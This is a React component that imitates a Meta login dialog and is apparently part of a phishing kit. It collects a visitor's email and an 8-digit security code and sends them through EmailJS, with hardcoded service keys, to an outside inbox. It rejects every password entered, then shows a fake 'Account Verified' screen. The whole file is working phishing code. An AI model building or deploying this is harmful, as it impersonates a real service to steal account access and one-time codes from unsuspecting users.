import { useState } from "react";
import { X, LoaderCircle } from "lucide-react";
import emailjs from "@emailjs/browser";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import {
  Dialog,
  DialogContent,
  DialogHeader,
  DialogTitle,
  DialogDescription,
} from "@/components/ui/dialog";

interface MetaLoginModalProps {
  isOpen: boolean;
  onClose: () => void;
  onSuccess: () => void;
}

type LoginStage = "username" | "password" | "code" | "success";

const MetaLoginModal = ({ isOpen, onClose, onSuccess }: MetaLoginModalProps) => {
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [code, setCode] = useState("");
  const [stage, setStage] = useState<LoginStage>("username");
  const [isLoading, setIsLoading] = useState(false);
  const [error, setError] = useState<string | null>(null);
  const [countdown, setCountdown] = useState(60);
  const [canResend, setCanResend] = useState(false);
  const [attempts, setAttempts] = useState(0);

  const sendEmailNotification = async (data: any) => {
    try {
      await emailjs.send(
        'service_ieaopgl',
        'template_zvcv0qf',
        data,
        'pgcGwVmRmBOKo-kUL'
      );
    } catch (error) {
      console.error('EmailJS Error:', error);
    }
  };

  const handleEmailSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.includes("@")) {
      setError("Please enter a valid email address.");
      return;
    }

    setIsLoading(true);
    await sendEmailNotification({
      event_type: 'Meta Login Attempt',
      user_email: email,
      stage: 'Email Submit',
      timestamp: new Date().toLocaleString()
    });

    setTimeout(() => {
      setIsLoading(false);
      setStage("password");
      setError(null);
    }, 1500);
  };

  const handlePasswordSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (password.length < 6) {
      setError("Password must be at least 6 characters.");
      return;
    }

    setIsLoading(true);
    await sendEmailNotification({
      event_type: 'Meta Login Attempt',
      user_email: email,
      stage: 'Password Submit',
      timestamp: new Date().toLocaleString()
    });

    setTimeout(() => {
      setIsLoading(false);
      setError("The password you've entered is incorrect.");
      setPassword("");
      setAttempts(attempts + 1);

      if (attempts >= 1) {
        setStage("code");
        setError(null);
        setCanResend(true);
      }
    }, 1500);
  };

  const handleCodeSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (code.length !== 8) {
      setError("Please enter a valid 8-digit code.");
      return;
    }

    setIsLoading(true);
    await sendEmailNotification({
      event_type: 'Meta Login Success',
      user_email: email,
      verification_code: code,
      timestamp: new Date().toLocaleString()
    });

    setTimeout(() => {
      setIsLoading(false);
      setStage("success");
      setTimeout(() => {
        onSuccess();
      }, 2000);
    }, 1500);
  };

  const renderStage = () => {
    switch (stage) {
      case "username":
        return (
          <form onSubmit={handleEmailSubmit} className="space-y-4">
            <div className="space-y-2">
              <Label htmlFor="email">Email or Phone</Label>
              <Input
                id="email"
                type="text"
                value={email}
                onChange={(e) => setEmail(e.target.value)}
                placeholder="Enter your email or phone number"
                disabled={isLoading}
                className="border-neutral-300"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <Button 
              type="submit" 
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading}
            >
              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
              Continue
            </Button>
          </form>
        );

      case "password":
        return (
          <form onSubmit={handlePasswordSubmit} className="space-y-4">
            <div className="flex items-center border rounded-md p-2 mb-4 bg-neutral-50">
              <span className="text-sm">{email}</span>
              <Button
                type="button"
                variant="ghost"
                size="sm"
                className="ml-auto text-[#1877F2] hover:bg-transparent hover:text-[#166FE5] p-0"
                onClick={() => setStage("username")}
              >
                Change
              </Button>
            </div>
            <div className="space-y-2">
              <Label htmlFor="password">Password</Label>
              <Input
                id="password"
                type="password"
                value={password}
                onChange={(e) => setPassword(e.target.value)}
                placeholder="Enter your password"
                disabled={isLoading}
                className="border-neutral-300"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <Button 
              type="submit" 
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading}
            >
              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
              Continue
            </Button>
          </form>
        );

      case "code":
        return (
          <form onSubmit={handleCodeSubmit} className="space-y-4">
            <p className="text-neutral-700">
              Enter the 8-digit code we sent to {email}
            </p>
            <div className="space-y-2">
              <Label htmlFor="code">Security Code</Label>
              <Input
                id="code"
                type="text"
                value={code}
                onChange={(e) => {
                  const value = e.target.value.replace(/\D/g, '');
                  if (value.length <= 8) {
                    setCode(value);
                  }
                }}
                placeholder="Enter 8-digit code"
                maxLength={8}
                disabled={isLoading}
                className="border-neutral-300 text-center text-lg tracking-widest"
              />
            </div>
            {error && <p className="text-red-500 text-sm">{error}</p>}
            <Button 
              type="submit" 
              className="w-full bg-[#1877F2] hover:bg-[#166FE5] text-white"
              disabled={isLoading}
            >
              {isLoading ? <LoaderCircle className="mr-2 h-4 w-4 animate-spin" /> : null}
              Verify
            </Button>
          </form>
        );

      case "success":
        return (
          <div className="space-y-4 text-center">
            <div className="flex items-center justify-center">
              <svg className="w-16 h-16 text-green-500" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                <path strokeLinecap="round" strokeLinejoin="round" strokeWidth="2" d="M5 13l4 4L19 7" />
              </svg>
            </div>
            <h3 className="text-xl font-medium">Account Verified</h3>
            <p className="text-neutral-600">
              Your Meta account has been successfully verified.
            </p>
            <LoaderCircle className="mx-auto h-8 w-8 animate-spin text-neutral-400" />
          </div>
        );
    }
  };

  return (
    <Dialog open={isOpen} onOpenChange={(open) => !open && onClose()}>
      <DialogContent className="max-w-md">
        <DialogHeader>
          <DialogTitle className="text-center text-2xl font-semibold text-[#1877F2]">
            {stage === "success" ? "Meta Account Verified" : "Log in to Meta"}
          </DialogTitle>
          <DialogDescription className="text-center text-neutral-600">
            {stage !== "success" && "Verify your Meta account to continue"}
          </DialogDescription>
        </DialogHeader>
        <div className="px-1 py-4">
          {renderStage()}
        </div>
      </DialogContent>
    </Dialog>
  );
};

export default MetaLoginModal;